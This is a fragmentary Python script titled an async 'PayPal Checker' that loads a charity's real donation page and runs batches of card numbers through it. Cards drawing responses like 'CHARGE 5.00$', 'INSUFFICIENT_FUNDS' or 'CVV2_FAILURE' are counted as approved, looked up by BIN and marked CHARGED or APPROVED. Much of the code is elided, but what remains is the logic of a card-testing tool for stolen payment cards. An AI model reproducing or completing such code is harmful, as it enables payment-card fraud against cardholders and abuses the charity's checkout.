...
# Async PayPal Checker with retry and fallback to aiohttp if playwright fails
            ...
            if PLAYWRIGHT_AVAILABLE:
                try:
                    async with async_playwright() as p:
                        ...
                        await page.goto('https://ananau.org/donate/donation/', timeout=60000)
                        await page.wait_for_load_state('networkidle')
                        text1 = await page.content()
                        await browser.close()
                    print(f"[DEBUG] Step 1: Page loaded with Playwright, Length={len(text1)}")
                except Exception as pw_e:
                    print(f"[DEBUG] Playwright failed: {pw_e}, falling back to aiohttp")
            ...
            if text1 is None:
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.get(
                        ...
                        text1 = await r1.text()
                        print(f"[DEBUG] Step 1 Response with aiohttp: Status={r1.status}, Length={len(text1)}")
...
"""
    ...
    # Escape HTML special characters in last to prevent parsing errors
...
"""
                ...
                for cc_parsed, result in zip(batch_parsed, results):
                    ...
                    if 'CHARGE 5.00$' in result or 'INSUFFICIENT_FUNDS' in result or 'CVV2_FAILURE' in result:
                        passs += 1
                        # Send approved card
                        bin_info = await dato(cc_parsed[:6])
                        
                        if 'CHARGE 5.00$' in result:
                            status_text = "CHARGED"
                        else:
                            status_text = "APPROVED"
...
async def main():
    ...
    if PLAYWRIGHT_AVAILABLE:
        ...
        print('- Playwright not available, using aiohttp fallback')
